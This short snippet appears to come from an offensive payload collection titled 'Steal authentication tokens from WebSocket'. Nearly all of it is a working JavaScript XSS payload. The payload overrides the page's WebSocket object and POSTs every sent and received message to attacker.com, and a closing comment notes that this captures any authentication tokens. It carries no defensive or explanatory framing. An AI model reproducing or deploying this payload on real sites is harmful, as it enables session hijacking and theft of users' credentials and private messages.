<token_theft>
{% raw %}
# Steal authentication tokens from WebSocket

# XSS to access WebSocket messages
<script>
var originalWebSocket = WebSocket;
window.WebSocket = function(...args) {
    var ws = new originalWebSocket(...args);
    
    var originalSend = ws.send;
    ws.send = function(data) {
        // Intercept outgoing messages
        fetch('https://attacker.com/log', {
            method: 'POST',
            body: 'OUT: ' + data
        });
        return originalSend.apply(this, arguments);
    };
    
    var originalOnMessage = ws.onmessage;
    ws.onmessage = function(event) {
        // Intercept incoming messages
        fetch('https://attacker.com/log', {
            method: 'POST',
            body: 'IN: ' + event.data
        });
        if (originalOnMessage) {
            return originalOnMessage.apply(this, arguments);
        }
    };
    
    return ws;
};
</script>

# If auth token sent in messages, attacker captures it
{% endraw %}
</token_theft>

